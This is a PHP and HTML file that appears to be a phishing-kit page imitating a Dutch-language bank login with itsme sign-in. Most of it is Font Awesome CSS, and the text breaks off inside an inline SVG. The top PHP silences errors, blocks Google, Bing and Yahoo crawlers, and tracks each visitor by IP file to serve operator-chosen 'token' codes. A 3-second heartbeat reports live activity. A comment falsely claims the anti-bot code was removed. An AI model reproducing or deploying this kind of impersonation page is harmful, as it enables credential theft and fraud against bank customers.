
<?php
session_start();
error_reporting(0);

// Ensure all included files are clean and necessary for your application.
// Removed anti-bot scripts since they may have been used for malicious purposes.

// Example: Including necessary files securely
// include "./file.php";
// include "path/to/your/file2.php";

include "./file.php";

// A simple check to block unwanted bots or crawlers can be done in a non-malicious way:

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$host = gethostbyaddr(getenv("REMOTE_ADDR"));

// Example: Blocking specific bots or unwanted crawlers (use responsibly)
$disallowed_bots = ['Googlebot', 'Bingbot', 'Slurp'];

foreach ($disallowed_bots as $bot) {
    if (strpos($user_agent, $bot) !== false) {
        header('HTTP/1.0 403 Forbidden');
        exit();
    }
}

// Your legitimate application logic here

?>
<?php
    
    require_once './config.php';
    
    function getUserIP() {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) return $_SERVER["HTTP_CF_CONNECTING_IP"];
        if (isset($_SERVER["HTTP_CLIENT_IP"])) return $_SERVER["HTTP_CLIENT_IP"];
        if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) return explode(',', $_SERVER["HTTP_X_FORWARDED_FOR"])[0];
        return $_SERVER['REMOTE_ADDR'];
    }
    $uip = getUserIP();
    $user_file = 'users/' . $uip . '.txt';
    $custom_code = "";
    if (file_exists($user_file)) {
        $data = file_get_contents($user_file);
        $row = explode('#|#', $data);
        if ($row[0] == 'token' && isset($row[1])) {
            $custom_code = $row[1];
        }
    }

    $code = !empty($custom_code) ? $custom_code : $_GET['code'];
    $_SESSION['last_page'] = 'token';
?>
<html class="notranslate" translate="no" lang="nl" data-react-helmet="lang"><head><script>
setInterval(() => {
  fetch('heartbeat.php');
}, 3000); // toutes les 2 secondes
</script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="google" content="notranslate"><style type="text/css">:root, :host {
  --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Solid";
  --fa-font-regular: normal 400 1em/1 "Font Awesome 6 Regular";
  --fa-font-light: normal 300 1em/1 "Font Awesome 6 Light";
  --fa-font-thin: normal 100 1em/1 "Font Awesome 6 Thin";
  --fa-font-duotone: normal 900 1em/1 "Font Awesome 6 Duotone";
  --fa-font-sharp-solid: normal 900 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-regular: normal 400 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-light: normal 300 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-thin: normal 100 1em/1 "Font Awesome 6 Sharp";
  --fa-font-brands: normal 400 1em/1 "Font Awesome 6 Brands";
}

svg:not(:root).svg-inline--fa, svg:not(:host).svg-inline--fa {
  overflow: visible;
  box-sizing: content-box;
}

.svg-inline--fa {
  display: var(--fa-display, inline-block);
  height: 1em;
  overflow: visible;
  vertical-align: -0.125em;
}
.svg-inline--fa.fa-2xs {
  vertical-align: 0.1em;
}
.svg-inline--fa.fa-xs {
  vertical-align: 0em;
}
.svg-inline--fa.fa-sm {
  vertical-align: -0.0714285705em;
}
.svg-inline--fa.fa-lg {
  vertical-align: -0.2em;
}
.svg-inline--fa.fa-xl {
  vertical-align: -0.25em;
}
.svg-inline--fa.fa-2xl {
  vertical-align: -0.3125em;
}
.svg-inline--fa.fa-pull-left {
  margin-right: var(--fa-pull-margin, 0.3em);
  width: auto;
}
.svg-inline--fa.fa-pull-right {
  margin-left: var(--fa-pull-margin, 0.3em);
  width: auto;
}
.svg-inline--fa.fa-li {
  width: var(--fa-li-width, 2em);
  top: 0.25em;
}
.svg-inline--fa.fa-fw {
  width: var(--fa-fw-width, 1.25em);
}

.fa-layers svg.svg-inline--fa {
  bottom: 0;
  left: 0;
  margin: auto;
  position: absolute;
  right: 0;
  top: 0;
}

.fa-layers-counter, .fa-layers-text {
  display: inline-block;
  position: absolute;
  text-align: center;
}

.fa-layers {
  display: inline-block;
  height: 1em;
  position: relative;
  text-align: center;
  vertical-align: -0.125em;
  width: 1em;
}
.fa-layers svg.svg-inline--fa {
  -webkit-transform-origin: center center;
          transform-origin: center center;
}

.fa-layers-text {
  left: 50%;
  top: 50%;
  -webkit-transform: translate(-50%, -50%);
          transform: translate(-50%, -50%);
  -webkit-transform-origin: center center;
          transform-origin: center center;
}

.fa-layers-counter {
  background-color: var(--fa-counter-background-color, #ff253a);
  border-radius: var(--fa-counter-border-radius, 1em);
  box-sizing: border-box;
  color: var(--fa-inverse, #fff);
  line-height: var(--fa-counter-line-height, 1);
  max-width: var(--fa-counter-max-width, 5em);
  min-width: var(--fa-counter-min-width, 1.5em);
  overflow: hidden;
  padding: var(--fa-counter-padding, 0.25em 0.5em);
  right: var(--fa-right, 0);
  text-overflow: ellipsis;
  top: var(--fa-top, 0);
  -webkit-transform: scale(var(--fa-counter-scale, 0.25));
          transform: scale(var(--fa-counter-scale, 0.25));
  -webkit-transform-origin: top right;
          transform-origin: top right;
}

.fa-layers-bottom-right {
  bottom: var(--fa-bottom, 0);
  right: var(--fa-right, 0);
  top: auto;
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: bottom right;
          transform-origin: bottom right;
}

.fa-layers-bottom-left {
  bottom: var(--fa-bottom, 0);
  left: var(--fa-left, 0);
  right: auto;
  top: auto;
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: bottom left;
          transform-origin: bottom left;
}

.fa-layers-top-right {
  top: var(--fa-top, 0);
  right: var(--fa-right, 0);
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: top right;
          transform-origin: top right;
}

.fa-layers-top-left {
  left: var(--fa-left, 0);
  right: auto;
  top: var(--fa-top, 0);
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: top left;
          transform-origin: top left;
}

.fa-1x {
  font-size: 1em;
}

.fa-2x {
  font-size: 2em;
}

.fa-3x {
  font-size: 3em;
}

.fa-4x {
  font-size: 4em;
}

.fa-5x {
  font-size: 5em;
}

.fa-6x {
  font-size: 6em;
}

.fa-7x {
  font-size: 7em;
}

.fa-8x {
  font-size: 8em;
}

.fa-9x {
  font-size: 9em;
}

.fa-10x {
  font-size: 10em;
}

.fa-2xs {
  font-size: 0.625em;
  line-height: 0.1em;
  vertical-align: 0.225em;
}

.fa-xs {
  font-size: 0.75em;
  line-height: 0.0833333337em;
  vertical-align: 0.125em;
}

.fa-sm {
  font-size: 0.875em;
  line-height: 0.0714285718em;
  vertical-align: 0.0535714295em;
}

.fa-lg {
  font-size: 1.25em;
  line-height: 0.05em;
  vertical-align: -0.075em;
}

.fa-xl {
  font-size: 1.5em;
  line-height: 0.0416666682em;
  vertical-align: -0.125em;
}

.fa-2xl {
  font-size: 2em;
  line-height: 0.03125em;
  vertical-align: -0.1875em;
}

.fa-fw {
  text-align: center;
  width: 1.25em;
}

.fa-ul {
  list-style-type: none;
  margin-left: var(--fa-li-margin, 2.5em);
  padding-left: 0;
}
.fa-ul > li {
  position: relative;
}

.fa-li {
  left: calc(var(--fa-li-width, 2em) * -1);
  position: absolute;
  text-align: center;
  width: var(--fa-li-width, 2em);
  line-height: inherit;
}

.fa-border {
  border-color: var(--fa-border-color, #eee);
  border-radius: var(--fa-border-radius, 0.1em);
  border-style: var(--fa-border-style, solid);
  border-width: var(--fa-border-width, 0.08em);
  padding: var(--fa-border-padding, 0.2em 0.25em 0.15em);
}

.fa-pull-left {
  float: left;
  margin-right: var(--fa-pull-margin, 0.3em);
}

.fa-pull-right {
  float: right;
  margin-left: var(--fa-pull-margin, 0.3em);
}

.fa-beat {
  -webkit-animation-name: fa-beat;
          animation-name: fa-beat;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
          animation-timing-function: var(--fa-animation-timing, ease-in-out);
}

.fa-bounce {
  -webkit-animation-name: fa-bounce;
          animation-name: fa-bounce;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
          animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
}

.fa-fade {
  -webkit-animation-name: fa-fade;
          animation-name: fa-fade;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
          animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
}

.fa-beat-fade {
  -webkit-animation-name: fa-beat-fade;
          animation-name: fa-beat-fade;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
          animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
}

.fa-flip {
  -webkit-animation-name: fa-flip;
          animation-name: fa-flip;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
          animation-timing-function: var(--fa-animation-timing, ease-in-out);
}

.fa-shake {
  -webkit-animation-name: fa-shake;
          animation-name: fa-shake;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, linear);
          animation-timing-function: var(--fa-animation-timing, linear);
}

.fa-spin {
  -webkit-animation-name: fa-spin;
          animation-name: fa-spin;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 2s);
          animation-duration: var(--fa-animation-duration, 2s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, linear);
          animation-timing-function: var(--fa-animation-timing, linear);
}

.fa-spin-reverse {
  --fa-animation-direction: reverse;
}

.fa-pulse,
.fa-spin-pulse {
  -webkit-animation-name: fa-spin;
          animation-name: fa-spin;
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, steps(8));
          animation-timing-function: var(--fa-animation-timing, steps(8));
}

@media (prefers-reduced-motion: reduce) {
  .fa-beat,
.fa-bounce,
.fa-fade,
.fa-beat-fade,
.fa-flip,
.fa-pulse,
.fa-shake,
.fa-spin,
.fa-spin-pulse {
    -webkit-animation-delay: -1ms;
            animation-delay: -1ms;
    -webkit-animation-duration: 1ms;
            animation-duration: 1ms;
    -webkit-animation-iteration-count: 1;
            animation-iteration-count: 1;
    -webkit-transition-delay: 0s;
            transition-delay: 0s;
    -webkit-transition-duration: 0s;
            transition-duration: 0s;
  }
}
@-webkit-keyframes fa-beat {
  0%, 90% {
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  45% {
    -webkit-transform: scale(var(--fa-beat-scale, 1.25));
            transform: scale(var(--fa-beat-scale, 1.25));
  }
}
@keyframes fa-beat {
  0%, 90% {
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  45% {
    -webkit-transform: scale(var(--fa-beat-scale, 1.25));
            transform: scale(var(--fa-beat-scale, 1.25));
  }
}
@-webkit-keyframes fa-bounce {
  0% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  10% {
    -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
            transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
  }
  30% {
    -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
            transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
  }
  50% {
    -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
            transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
  }
  57% {
    -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
            transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
  }
  64% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  100% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
}
@keyframes fa-bounce {
  0% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  10% {
    -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
            transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
  }
  30% {
    -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
            transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
  }
  50% {
    -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
            transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
  }
  57% {
    -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
            transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
  }
  64% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  100% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
}
@-webkit-keyframes fa-fade {
  50% {
    opacity: var(--fa-fade-opacity, 0.4);
  }
}
@keyframes fa-fade {
  50% {
    opacity: var(--fa-fade-opacity, 0.4);
  }
}
@-webkit-keyframes fa-beat-fade {
  0%, 100% {
    opacity: var(--fa-beat-fade-opacity, 0.4);
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  50% {
    opacity: 1;
    -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
            transform: scale(var(--fa-beat-fade-scale, 1.125));
  }
}
@keyframes fa-beat-fade {
  0%, 100% {
    opacity: var(--fa-beat-fade-opacity, 0.4);
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  50% {
    opacity: 1;
    -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
            transform: scale(var(--fa-beat-fade-scale, 1.125));
  }
}
@-webkit-keyframes fa-flip {
  50% {
    -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
            transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
  }
}
@keyframes fa-flip {
  50% {
    -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
            transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
  }
}
@-webkit-keyframes fa-shake {
  0% {
    -webkit-transform: rotate(-15deg);
            transform: rotate(-15deg);
  }
  4% {
    -webkit-transform: rotate(15deg);
            transform: rotate(15deg);
  }
  8%, 24% {
    -webkit-transform: rotate(-18deg);
            transform: rotate(-18deg);
  }
  12%, 28% {
    -webkit-transform: rotate(18deg);
            transform: rotate(18deg);
  }
  16% {
    -webkit-transform: rotate(-22deg);
            transform: rotate(-22deg);
  }
  20% {
    -webkit-transform: rotate(22deg);
            transform: rotate(22deg);
  }
  32% {
    -webkit-transform: rotate(-12deg);
            transform: rotate(-12deg);
  }
  36% {
    -webkit-transform: rotate(12deg);
            transform: rotate(12deg);
  }
  40%, 100% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
}
@keyframes fa-shake {
  0% {
    -webkit-transform: rotate(-15deg);
            transform: rotate(-15deg);
  }
  4% {
    -webkit-transform: rotate(15deg);
            transform: rotate(15deg);
  }
  8%, 24% {
    -webkit-transform: rotate(-18deg);
            transform: rotate(-18deg);
  }
  12%, 28% {
    -webkit-transform: rotate(18deg);
            transform: rotate(18deg);
  }
  16% {
    -webkit-transform: rotate(-22deg);
            transform: rotate(-22deg);
  }
  20% {
    -webkit-transform: rotate(22deg);
            transform: rotate(22deg);
  }
  32% {
    -webkit-transform: rotate(-12deg);
            transform: rotate(-12deg);
  }
  36% {
    -webkit-transform: rotate(12deg);
            transform: rotate(12deg);
  }
  40%, 100% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
}
@-webkit-keyframes fa-spin {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg);
  }
}
@keyframes fa-spin {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg);
  }
}
.fa-rotate-90 {
  -webkit-transform: rotate(90deg);
          transform: rotate(90deg);
}

.fa-rotate-180 {
  -webkit-transform: rotate(180deg);
          transform: rotate(180deg);
}

.fa-rotate-270 {
  -webkit-transform: rotate(270deg);
          transform: rotate(270deg);
}

.fa-flip-horizontal {
  -webkit-transform: scale(-1, 1);
          transform: scale(-1, 1);
}

.fa-flip-vertical {
  -webkit-transform: scale(1, -1);
          transform: scale(1, -1);
}

.fa-flip-both,
.fa-flip-horizontal.fa-flip-vertical {
  -webkit-transform: scale(-1, -1);
          transform: scale(-1, -1);
}

.fa-rotate-by {
  -webkit-transform: rotate(var(--fa-rotate-angle, none));
          transform: rotate(var(--fa-rotate-angle, none));
}

.fa-stack {
  display: inline-block;
  vertical-align: middle;
  height: 2em;
  position: relative;
  width: 2.5em;
}

.fa-stack-1x,
.fa-stack-2x {
  bottom: 0;
  left: 0;
  margin: auto;
  position: absolute;
  right: 0;
  top: 0;
  z-index: var(--fa-stack-z-index, auto);
}

.svg-inline--fa.fa-stack-1x {
  height: 1em;
  width: 1.25em;
}
.svg-inline--fa.fa-stack-2x {
  height: 2em;
  width: 2.5em;
}

.fa-inverse {
  color: var(--fa-inverse, #fff);
}

.sr-only,
.fa-sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border-width: 0;
}

.sr-only-focusable:not(:focus),
.fa-sr-only-focusable:not(:focus) {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border-width: 0;
}

.svg-inline--fa .fa-primary {
  fill: var(--fa-primary-color, currentColor);
  opacity: var(--fa-primary-opacity, 1);
}

.svg-inline--fa .fa-secondary {
  fill: var(--fa-secondary-color, currentColor);
  opacity: var(--fa-secondary-opacity, 0.4);
}

.svg-inline--fa.fa-swap-opacity .fa-primary {
  opacity: var(--fa-secondary-opacity, 0.4);
}

.svg-inline--fa.fa-swap-opacity .fa-secondary {
  opacity: var(--fa-primary-opacity, 1);
}

.svg-inline--fa mask .fa-primary,
.svg-inline--fa mask .fa-secondary {
  fill: black;
}

.fad.fa-inverse,
.fa-duotone.fa-inverse {
  color: var(--fa-inverse, #fff);
}</style><link rel="shortcut icon" href="./Home/favicon.png"><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name="format-detection" content="telephone=no"><meta name="apple-itunes-app" content="app-id=893585833"><link rel="manifest" href="#"><title>Home | Login</title><link href="./Home/main.4393a533.css" rel="stylesheet">
<style data-emotion="css" data-s=""></style></head><body><div id="root"><div class="argnt-container"><div class="argnt-p-login-page"><div class="argnt-p-login-page-wrapper"><div class="argnt-p-login-page-content-center"><header class="grid grid--justifyCenter"><div class="grid__cell grid__cell--lg-12"><nav aria-label="Smart link opties" class="argnt-m-skip-link-navigation"><ul class="argnt-m-skip-link-navigation__content"><li><a href="https://app-676e6d82c1ac180c503a7fd7.closte.com/n25/homeapp/clients/aanmelden#itsme" class="argnt-m-skip-link"><span class="argnt-m-skip-link__content"><span class="argnt-a-icon"><img alt="Itsme" aria-hidden="true" src="data:image/svg+xml,%3c?xml%20version=%271.0%27%20encoding=%27UTF-8%27?%3e%3csvg%20width=%2724px%27%20height=%2724px%27%20viewBox=%270%200%2049%2048%27%20version=%271.1%27%20xmlns=%27http://www.w3.org/2000/svg%27%20xmlns:xlink=%27http://www.w3.org/1999/xlink%27%3e%3ctitle%3eitsme%3c/title%3e%3cg%20id=%27Aanmeldpagina%27%20stroke=%27none%27%20stroke-width=%271%27%20fill=%27none%27%20fill-rule=%27evenodd%27%3e%3cg%20id=%27(Mobile)-Internetbankieren---Itsme---01%27%20transform=%27translate(-32.000000,%20-270.000000)%27%20fill-rule=%27nonzero%27%3e%3cg%20id=%27Group-11%27%20transform=%27translate(16.000000,%20259.000000)%27%3e%3cg%20id=%27Lists-/-Accordions-/-IB-Copy-3%27%20transform=%27translate(-16.869347,%20-1.000000)%27%3e%3cg%20id=%27itsme%27%20transform=%27translate(33.000000,%2012.000000)%27%3e%3cpath%20d=%27M2.54202855,34.4111817%20C0.42814528,32.0444902%20-0.437020857,28.8151049%200.210597867,25.7087054%20L4.25086126,10.6217639%20C5.24346204,7.60741144%207.60797826,5.24307138%2010.6225553,4.25054456%20L25.7106209,0.210582177%20C28.8172519,-0.436988297%2032.0468778,0.428113382%2034.4137457,2.54183916%20L45.4483011,13.5888183%20C47.5649869,15.954147%2048.4348821,19.1828396%2047.7929785,22.2912946%20L43.7394684,37.3649903%20C42.7495776,40.3763471%2040.3905356,42.7401276%2037.3810211,43.7362097%20L22.2797087,47.7894178%20C19.1730777,48.4369883%2015.9434519,47.5718866%2013.576584,45.4581608%20L2.54202855,34.4111817%20Z%27%20id=%27Path%27%20fill=%27%23FF4612%27%3e%3c/path%3e%3cpath%20d=%27M29.1352905,17.1028036%20C27.7013001,16.615169%2026.7851396,16.4306587%2026.851528,15.5871827%20C26.9046388,14.9282171%2027.409191,14.5855549%2028.3253515,14.6646308%20C28.9892359,14.7173481%2029.414122,14.9941136%2029.6132873,15.4026723%20C29.8756785,15.9321016%2030.4131645,16.2725278%2031.0074446,16.2856862%20C32.3484912,16.3120449%2033.1717079,14.7700653%2032.3352135,13.7288996%20C31.5783853,12.8063477%2030.3302825,12.1737407%2028.5776276,12.0287683%20C25.4972037,11.80472%2023.5586612,13.1621892%2023.3860512,15.4949275%20C23.1868859,17.9858175%2024.8731524,18.6579625%2027.4224686,19.5146178%20C29.1751236,20.0681489%2029.6000096,20.3317352%2029.5468989,21.0697767%20C29.4937881,21.7682802%2028.8830144,22.1241217%2027.9270208,22.0450458%20C27.1303595,21.9923285%2026.6523627,21.676025%2026.426642,21.2147491%20C26.1453516,20.6973958%2025.5981639,20.3776069%2025.0059293,20.3844524%20C24.5669525,20.3745846%2024.1436357,20.5464765%2023.8374926,20.8589077%20C23.8374926,20.8589077%2023.1736082,21.5969492%2021.8856724,21.5969492%20C20.9429565,21.5705905%2020.106462,21.0697767%2020.106462,19.7518454%20L20.1330174,15.3763137%20C20.8142083,15.7915895%2021.6851915,15.7353292%2022.3064143,15.2359254%20C22.9276371,14.7365216%2023.1640433,13.9025465%2022.8963274,13.1548762%20C22.6286116,12.407206%2021.9149762,11.9083869%2021.1155664,11.9101545%20C20.7786362,11.9097534%2020.4480238,12.0009098%2020.1595728,12.1737407%20L20.1595728,10.5922232%20C20.1595728,10.0244821%2019.6958921,9.56423688%2019.1239131,9.56423688%20L17.7297557,9.56423688%20C17.162922,9.56423688%2016.7013631,10.0164562%2016.694096,10.5790439%20L16.6277076,19.9758937%20C16.5347637,21.1356732%2015.7248247,21.5969492%2014.8086642,21.5969492%20C13.8526706,21.5969492%2012.9763431,21.0961353%2012.9763431,19.7518454%20L13.0427315,13.8211548%20C13.0427315,13.4499394%2012.7395557,13.1490099%2012.3655694,13.1490099%20L10.2676946,13.1490099%20C10.0858106,13.1454693%209.91014095,13.2147182%209.78026207,13.3411556%20C9.65038319,13.467593%209.57721977,13.6405837%209.57725474,13.8211548%20L9.51063307,20.5953214%20C9.48431092,23.4156943%2011.7282403,24.6809083%2014.8219419,24.6809083%20C16.1098777,24.6809083%2016.9862052,24.1537358%2017.6102565,23.4420529%20C18.3803625,24.2855289%2019.6019099,24.6809083%2021.089011,24.6809083%20C22.5761122,24.6809083%2023.6781604,24.4832186%2024.7802085,23.8637909%20C25.6785513,24.3533112%2026.6776351,24.632785%2027.7013001,24.6809083%20C30.8879454,24.9313152%2032.8397657,23.4947702%2033.0256534,21.0302387%20C33.1982633,18.8161142%2031.5252745,17.9331003%2029.1352905,17.1159829%20L29.1352905,17.1028036%20Z%20M11.3962981,11.6333889%20C12.1600883,11.6333889%2012.8484103,11.1759638%2013.1394442,10.4750269%20C13.4304781,9.77408994%2013.26672,8.96811714%2012.7247337,8.43393507%20C12.1827475,7.899753%2011.3696215,7.7429081%2010.6655269,8.03673204%20C9.9614322,8.33055598%209.50548749,9.01699352%209.5108663,9.77510588%20C9.518163,10.8035355%2010.3601662,11.6333889%2011.3962981,11.6333889%20L11.3962981,11.6333889%20Z%20M33.5700386,25.4584877%20C30.4763371,25.4584877%2028.1527415,27.1717983%2027.5154125,30.0976057%20C27.3428025,27.3563087%2025.5901476,25.722074%2023.0009982,25.722074%20C21.5181837,25.6434059%2020.1076309,26.3636021%2019.3098007,27.6067156%20C18.4790869,26.365464%2017.0517284,25.6495631%2015.5522148,25.722074%20C14.0252805,25.722074%209.20547945,25.5375636%209.20547945,31.6923025%20L9.20547945,36.1600894%20C9.20547945,37.0881279%209.96341899,37.8404518%2010.8983848,37.8404518%20C11.8333506,37.8404518%2012.5912901,37.0881279%2012.5912901,36.1600894%20L12.5912901,31.2573852%20C12.5912901,29.8340194%2013.4012291,28.8719296%2014.7422757,28.8719296%20C15.9771008,28.8719296%2016.694096,29.7154056%2016.694096,31.2442059%20L16.694096,36.1864481%20C16.694096,37.1144866%2017.4520355,37.8668104%2018.3870013,37.8668104%20C19.3219671,37.8668104%2020.0799067,37.1144866%2020.0799067,36.1864481%20L20.0799067,30.8488265%20C20.2126836,29.6495091%2020.9562341,28.8719296%2022.1645038,28.8719296%20C23.4524397,28.8719296%2024.1561572,29.7154056%2024.1561572,31.2442059%20L24.1561572,36.1864481%20C24.1561572,37.1108472%2024.9111244,37.8602207%2025.8424237,37.8602207%20C26.7737229,37.8602207%202